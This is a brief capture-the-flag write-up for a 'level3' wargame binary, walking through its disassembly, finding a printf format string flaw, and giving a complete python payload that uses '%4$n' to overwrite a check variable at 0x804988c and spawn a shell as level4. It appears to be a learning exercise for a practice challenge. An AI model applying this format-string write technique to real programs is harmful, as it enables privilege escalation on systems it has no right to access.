level3 binary with the rights of level4

main call v

about v:
fgets call (non exploitable)
printf call that prints what we wrote in stdin
moves an uninitialized variable (address 0x804988c) to eax to some address and then compares it to 0x40 (= 64)
jne to the end
else
fwrite call
system call

printf is exploitable (format string attack) -> we can send '%x' to get modifyable address

https://en.wikipedia.org/wiki/Printf_format_string

"AAAA" + "%x " * 10 tells us that we are modifying the 4th modifyer address

we can modify the value of the variable at address 0x804988c by using %n modifyer
%n modifyer sets the value pointed by the address with the number of previous characters

we need it at 64.

we can modify only this address using %4$n format

finally,

chmod 777 . && touch exploit && chmod 777 exploit
python -c 'print("\x8c\x98\x04\x08" + "a" * 60 + "%4$n")' > exploit
cat exploit - | ./level3

we are inside a shell as level4 user
